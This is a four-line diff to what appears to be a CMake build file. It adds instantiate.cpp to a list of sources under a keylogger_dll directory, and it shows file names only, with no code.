@@ -87,4 +87,5 @@ endif (UNIX)
 		keylogger_dll/Keylogger.cpp
 		keylogger_dll/MouseEvent.cpp
 		keylogger_dll/MouseHook.cpp
+		keylogger_dll/instantiate.cpp
 	)
